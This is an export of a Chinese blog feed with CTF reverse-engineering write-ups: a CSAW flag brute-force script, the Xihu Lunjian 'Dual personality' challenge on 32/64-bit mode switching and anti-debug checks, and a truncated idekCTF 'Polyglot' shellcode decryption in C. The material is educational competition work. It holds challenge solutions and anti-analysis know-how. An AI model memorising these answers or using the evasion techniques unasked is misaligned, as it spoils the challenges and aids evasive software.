operator">=</span> a <span class="token operator">+</span> flag<span class="token punctuation">[</span>j<span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">]</span>        SEED<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> SEED<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> data<span class="token punctuation">[</span>b<span class="token punctuation">]</span>            res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> SEED<span class="token punctuation">:</span>        res<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>SEED<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">*</span>m<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">^</span> SEED<span class="token punctuation">[</span>k<span class="token punctuation">]</span>            b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>SEED<span class="token punctuation">[</span>k<span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span>            SEED<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">^</span> b                   res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> SEED<span class="token punctuation">:</span>        res<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">return</span> res <span class="token operator">==</span> EXPECTED_FLAG<span class="token comment"># flag = [ord(i) for i in "aN0ther_HeRRing_or_iS_tHis_iT"]</span><span class="token comment"># print(verify(flag))</span>FLAG <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> EXPECTED_FLAG<span class="token punctuation">]</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">*</span>m<span class="token punctuation">)</span> <span class="token operator">^</span> FLAG<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">if</span> FLAG<span class="token punctuation">[</span>k <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'n'</span> <span class="token keyword">else</span> <span class="token number">0</span><span class="token punctuation">)</span>        FLAG<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">^</span> b<span class="token keyword">print</span><span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>SEED_1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>SEED<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    SEED_1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>FLAG<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> SEED<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>SEED_1<span class="token punctuation">)</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>res1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i  <span class="token operator">^</span>  data<span class="token punctuation">[</span> data<span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">*</span>index<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span> <span class="token operator">==</span> SEED_1<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> index <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>                res<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            res<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token punctuation">[</span>data<span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">*</span>index<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">256</span> <span class="token operator">==</span> SEED_1<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> index <span class="token keyword">not</span> <span class="token keyword">in</span> res1<span class="token punctuation">:</span>                res1<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            res1<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res1<span class="token punctuation">)</span><span class="token comment"># 确定最大的长度</span><span class="token keyword">for</span> max_len <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> max_len <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">for</span> str_len <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>max_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">""</span>    not_flag <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>str_len<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> res<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>index<span class="token operator">+</span>str_len<span class="token punctuation">)</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res1 <span class="token keyword">or</span> res<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res1<span class="token punctuation">[</span>index<span class="token operator">+</span>str_len<span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token comment"># 没有解，或者不包含对应解 都排除</span>                <span class="token keyword">break</span>        <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> index<span class="token operator">+</span>str_len <span class="token keyword">not</span> <span class="token keyword">in</span> res1<span class="token punctuation">:</span>                <span class="token keyword">break</span>            comman_element_list <span class="token operator">=</span> <span class="token punctuation">[</span>element <span class="token keyword">for</span> element <span class="token keyword">in</span> res<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token keyword">if</span> element <span class="token keyword">in</span> res1<span class="token punctuation">[</span>index<span class="token operator">+</span>str_len<span class="token punctuation">]</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>comman_element_list<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                not_flag <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> comman_element_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment"># 任意挑一个就行，为了方便就直接选第一个了</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">==</span>str_len <span class="token keyword">and</span> <span class="token keyword">not</span> not_flag<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"csawctf&#123;&#123;&#123;&#125;&#125;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="问题体现"><a href="#问题体现" class="headerlink" title="问题体现"></a>问题体现</h2><p>第一个问题，不用说了，每次编程相信你都有体会。</p><p>第二个问题，就像这个逆向题中，我宁可一个一个对比，都不编程解决这个问题。跟结果失之交臂。我一直认为字符串的长度是30。因为我没看到前面的<code>a</code>。可问题不只有这一个原因，换一种展现形式，换程序解答，不仅我会对问题更加清楚，同时也方便我找到答案。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/image-20230919153446311.png" alt="image-20230919153446311"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup for 西湖论剑CTF</title>
      <link href="/2023/02/16/xi-hu-lun-jian-ctf-writeup-2022/"/>
      <url>/2023/02/16/xi-hu-lun-jian-ctf-writeup-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="西湖论剑CTF"><a href="#西湖论剑CTF" class="headerlink" title="西湖论剑CTF"></a>西湖论剑CTF</h1><p>这个比赛只做了一道题，看了很久确实也没做出来。没有想到程序的执行逻辑可以在32位和64位的不同执行环境下进行切换。</p><h2 id="Dual-personality"><a href="#Dual-personality" class="headerlink" title="Dual personality"></a>Dual personality</h2><p>总体来讲该程序 </p><ul><li><p>第一次 从 <code>32-&gt; 64 赋值key -&gt; 32</code></p></li><li><p>第二次 从 <code>32-&gt; 64 循环左移 -&gt; 32</code></p></li><li><p>第三次 从 <code>32 -&gt; 64 进行了两次加密，一次就是基本的逻辑运算，另一次是异或。-&gt; 32</code></p></li></ul><ol><li>将exe程序送进ida，发现main函数无法被正常反编译。</li></ol><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/1676538544590.png" alt="反编译main函数"></p><p><code>sub_401120</code>函数会把下面的二进制修改为 <code>EA D0 11 40 00 33 00</code>—–<code>jmp far 33:004011D0h</code>往后面跳转之后程序就变成了执行64位语句了。所以需要把相应的二进制dump下来放到64位ida中进行分析。</p><blockquote><p>这里不要被这个 <code>jmp far ptr loc_4014FE+2</code>给欺骗了，这个语句没有被正确解析。这句话会远跳转到33:4011D0这个地址。远跳转有一个隐形的操作，他会将代码段寄存器CS设置为跳转到的这个段对应的段选择子，这里执行完了远跳转之后CS的值会变为0x33，</p></blockquote><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20230216171224.png" alt="更改程序语句"></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20230216171341.png" alt="jmp far 33:004011D0h"></p><ol start="2"><li>把4011d0h地址处的二进制dump出来用ida64分析之后。</li></ol><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20230216173515.png" alt="64位ida分析"></p><blockquote><p>注意 gs:qword_60 中 qword_60 是指 <code>60 00 00 00</code>而不是 0x00000060地址处的内容，否则人家会写成 <code>gs:[qword_60] </code><br><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20230216202725.png" alt="qword_60"></p></blockquote><ol start="3"><li>其实 <code>407000h</code>处存放的是原本 <code>call sub_401120</code>下面一句的地址 <code>004013E8</code>。当返回32位执行模式之后，刚好回到下面的语句。</li></ol><p>这里有一个加密的过程。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20230216195345.png" alt="加密过程"></p><ol start="4"><li>在加密完成之后，有一个 <code>call fword ptr</code> 其实和 <code>jmp far</code>是一样的道理切换到 64位模式下执行。</li></ol><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20230216195947.png" alt="call fword ptr"></p><p>这次跳转的地址为 <code>00401200</code>, 跟之前的操作是一样的， 同样是dump下来放到ida中分析。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20230216202940.png" alt="00401200"></p><p>注意这里面的 <code>0x40705c</code> – 在第一次跳转到64模式下执行的过程中，将 <code>BeingDebugged</code>的标志位放到了这个地址里面。</p><blockquote><p><code>__ROL8__</code> 是一个循环左移的操作 其中<code>retaddr[1]</code>指向的实际上是 <code>用户输入</code>。</p></blockquote><p>执行完成之后返回到32位执行环境中。</p><ol start="5"><li>第三次跳转到64位环境里面</li></ol><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20230216205121.png" alt="第三次跳转"></p><p>同样dump 0x401290的字节码，使用64位IDA分析，这个函数主要修改了0x407000保存的返回值，然后对0x407014开始 的数组中的常量进行处理，得到新的值。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20230216205403.png" alt="0x401290"></p><p><strong>注意的是 407050h 存放的是<code>0x401467</code></strong></p><p><strong>注意：前两次切换到64位模式后，函数结束就重新切换到32位模式了，但是这次出来后仍然为64位模式，因此main函数之后的代码也都是64位的指令</strong></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20230216213201.png" alt="32位下"></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20230216213059.png" alt="64位下"></p><blockquote><p>此时 <code>407000h</code>中存放的实际上是 <code>0x004014C5</code><br><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20230216213842.png" alt="第三次跳转时已经修改了407000h中的存放的地址"></p></blockquote><ol start="6"><li>后面就是常见的比较字符串的操作了。</li></ol><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20230216215312.png" alt="跟密文进行比较"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><p>win PEB 中BeingDebugged标志位获取—<a href="https://blog.csdn.net/Simon798/article/details/100702034">https://blog.csdn.net/Simon798/article/details/100702034</a></p></li><li><p>MK_FP – <a href="https://baike.baidu.com/item/MK_FP">https://baike.baidu.com/item/MK_FP</a></p></li><li><p>ret 和 retf 的区别 – <a href="https://zhuanlan.zhihu.com/p/372398363">https://zhuanlan.zhihu.com/p/372398363</a></p></li><li><p>西湖论剑官方RE-Writeup  —-<a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247504667&amp;idx=1&amp;sn=ce9b15211cf7a9658e96697a14f361f7&amp;chksm=fbf4496bcc83c07d1c704d81479c4fc75169661fe98d58f73d61b92af3579da64d3f9dcba810&amp;mpshare=1&amp;scene=23&amp;srcid=0213j43MPfxQ7G87C9gjkRQh&amp;sharer_sharetime=1676276996609&amp;sharer_shareid=029344dcf9624c2d719bc3d553ed4aa3#rd">https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247504667&amp;idx=1&amp;sn=ce9b15211cf7a9658e96697a14f361f7&amp;chksm=fbf4496bcc83c07d1c704d81479c4fc75169661fe98d58f73d61b92af3579da64d3f9dcba810&amp;mpshare=1&amp;scene=23&amp;srcid=0213j43MPfxQ7G87C9gjkRQh&amp;sharer_sharetime=1676276996609&amp;sharer_shareid=029344dcf9624c2d719bc3d553ed4aa3#rd</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup for idekCTF</title>
      <link href="/2023/01/15/idek-ctf-writeup-2022/"/>
      <url>/2023/01/15/idek-ctf-writeup-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="idekCTF"><a href="#idekCTF" class="headerlink" title="idekCTF"></a>idekCTF</h1><h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="Polyglot"><a href="#Polyglot" class="headerlink" title="Polyglot"></a>Polyglot</h3><p>题目Polyglot，首先这个单词的英文含义就是<code>通晓(或使用)多种语言的；用多种语言写成的；通晓并使用多种语言的</code>,这个也算是一个提示把。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20230115201314.png" alt="题目"></p><p>题目中给出的是一个代码片段，不是完整的程序。 <code>x86</code>和<code>ARM</code>两种架构反编译之后会得到不同的执行流。但是程序开头的第一句肯定是指令而不是数据，因为CPU无法判断这些二进制是否是数据。</p><p>这个shellcode是把<code>x86</code>和<code>ARM</code>两种不同的架构集成到一起了，在程序的开头第一句指令做了兼容，在<code>x86</code>下，会直接跳转。而在<code>ARM</code>架构下则会执行。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20230115202453.png" alt="ARM架构下"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20230115202655.png" alt="X86架构下"></p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>将<code>Polyglot</code>分别在<code>x86</code>和<code>ARM</code>两种架构下，进行反编译操作。通过解析代码流程，逆向解密过程。</p><p><code>ARM</code>架构下的代码比较好分析，就是一个循环的异或操作，本身没有什么困难的地方。</p><p><code>X86</code>架构下，则要困难一些，包含了两个解密操作。   <strong>The x64 has rc4  —歪果仁说这个加密操作涉及RC4</strong></p><p>第一个解密操作，按照正常汇编代码的逻辑，然后用c语言复现了一遍。</p><p>第二个解密操作，汇编代码稍微有点复杂，所以是直接复制的ida反编译之后的函数。然后判断了一下这个函数的参数。</p><h4 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h4><h5 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h5><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++"># include &lt;stdio.h&gt;# include  &lt;stdint.h&gt;#define HIBYTE(w)       ((uint8_t)(((uint16_t)(w) &gt;&gt; 8)))#define LOBYTE(w)       ((uint8_t)(w))unsigned char rsp[0x158] &#x3D; &#123;  &#x2F;&#x2F;3C1  ---00h  0x18, 0x25, 0x37, 0x37, 0xF5, 0x14, 0x70, 0x63, 0x59, 0x1D,   0x85, 0x0E, 0xA5, 0xD9, 0xDB,  &#x2F;&#x2F;rax -- 0Fh  0x80, 0xAA, 0x0A, 0xB4, 0x41, 0x8E, 0x7B, 0x1B,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00,    &#x2F;&#x2F;3a1--20h  0x62, 0x5A, 0x46, 0x8A, 0xAA, 0x47, 0xB6, 0x87, 0x84, 0xBF,   0x1B, 0xE6, 0xDA, 0x0A, 0xD7, 0x40,  &#x2F;&#x2F;3b1 --30h  0x81, 0x0E, 0x14, 0x6A, 0xF7, 0x6E, 0x2B, 0xF1, 0x19, 0xD5,   0x2E, 0x33, 0xA8, 0xB6, 0xD1, 0x76,  &#x2F;&#x2F;rdi ---40h0x00, 0x00,&#x2F;&#x2F;2a1 ---rdi+2  0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,   0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,  &#x2F;&#x2F;2b1 ---rdi+12h  0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19,   0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,  &#x2F;&#x2F;2c1 ---rdi+22h  0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,   0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,  &#x2F;&#x2F;2d1 ---rdi+32h  0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39,   0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,  &#x2F;&#x2F;2e1 ---rdi+42h  0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49,   0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,  &#x2F;&#x2F;2f1 ---rdi+52h  0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59,   0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,  &#x2F;&#x2F;301 ---rdi+62h  0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69,   0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,  &#x2F;&#x2F;311 ---rdi+72h  0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79,   0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,  &#x2F;&#x2F;321 ---rdi+82h  0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89,   0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,  &#x2F;&#x2F;331 ---rdi+92h  0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99,   0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,  &#x2F;&#x2F;341 ---rdi+A2h  0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9,   0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,  &#x2F;&#x2F;351 ---rdi+B2h  0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9,   0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,  &#x2F;&#x2F;361 ---rdi+C2h  0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9,   0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,  &#x2F;&#x2F;371 ---rdi+D2h  0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9,   0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,  &#x2F;&#x2F;381 ---rdi+E2h  0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9,   0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,  &#x2F;&#x2F;391 ---rdi+F2h  0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8, 0xF9,   0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF,  &#125;;int16_t  sub_1A2(int64_t a1, int64_t a2) &#x2F;&#x2F; a1 &#x3D; rcx 0x100  a2 &#x3D; rdx  0x17&#123;  int16_t *v2 &#x3D; (int16_t*) (rsp + 0x40); &#x2F;&#x2F; rdi  uint8_t *v3 &#x3D; (uint8_t*)rsp; &#x2F;&#x2F; rsi    int16_t result; &#x2F;&#x2F; ax  int16_t *v5;&#x2F;&#x2F; r10  uint8_t v6;&#x2F;&#x2F; bl  unsigned char v7; &#x2F;&#x2F; r11 8;    &#x2F;&#x2F;LOBYTE(result) &#x3D; v8 + v7;  unsigned char v8; &#x2F;&#x2F; bp  int16_t *v9; &#x2F;&#x2F; rdi  uint8_t *v10; &#x2F;&#x2F; r9  unsigned char v11; &#x2F;&#x2F; r8  unsigned char *v12; &#x2F;&#x2F; rdx  unsigned char v13; &#x2F;&#x2F; al  unsigned char *v14; &#x2F;&#x2F; rcx  unsigned char v15; &#x2F;&#x2F; r12  result &#x3D; *v2;  v5 &#x3D; v2;  v6 &#x3D; HIBYTE(*v2);  if ( a2 )  &#123;    v7 &#x3D; a2;    v8 &#x3D; *v2;    v9 &#x3D; v2 + 1;    v10 &#x3D; &amp;v3[a2];    v11 &#x3D; result - (uint8_t)v3 + 1;    do    &#123;      v12 &#x3D; (unsigned char *)v9 + (unsigned char)(v11 + (uint8_t)v3);      v13 &#x3D; *v12;      v6 +&#x3D; *v12;      v14 &#x3D; (unsigned char *)v9 + v6;      v15 &#x3D; *v14;      *v12 &#x3D; *v14;      *v14 &#x3D; v13;      *v3++ ^&#x3D; *((uint8_t *)v9 + (unsigned char)(v15 + v13));    &#125;    while ( v10 !&#x3D; v3 );    result &#x3D; ((uint16_t)v6 &lt;&lt; 8) | (uint16_t) (v8+v7) ;    &#x2F;&#x2F;LOBYTE(result) &#x3D; v8 + v7;    &#x2F;&#x2F;HIBYTE(result) &#x3D; v6;  &#125;  *v5 &#x3D; result;  return result;&#125;int main()&#123;int rcx &#x3D; 0;uint32_t r8d &#x3D; 0;int rax &#x3D; 0;  uint32_t r9d;int r10 &#x3D; 0x20;uint16_t* rdi &#x3D; (uint16_t*) (rsp + 0x40);uint16_t* rsi &#x3D; (uint16_t*) (rsp + 0x20);do&#123;r9d &#x3D; ((uint8_t*)rdi)[rcx + 2];r8d &#x3D; r8d + r9d + ((uint8_t*)rsi)[rcx % r10];&#x2F;&#x2F;r8d &#x3D; r8d + rax;rax &#x3D; LOBYTE(r8d);((uint8_t *)rdi)[rcx + 2] &#x3D; ((uint8_t*)rdi)[ rax + 2];rcx &#x3D; rcx + 1;((uint8_t*)rdi)[rax + 2]&#x3D; r9d;&#125;while(rcx!&#x3D;256);sub_1A2(0x100,0x17);write(1, rsp, 0x17);rax &#x3D; 0x291;((uint32_t *)rsp)[rax] +&#x3D; (uint32_t)rax;&#x2F;&#x2F;((uint32_t *)rsp)[rax - 0x39] &#x3D;   return 0;&#125;<span aria-hidden="true" 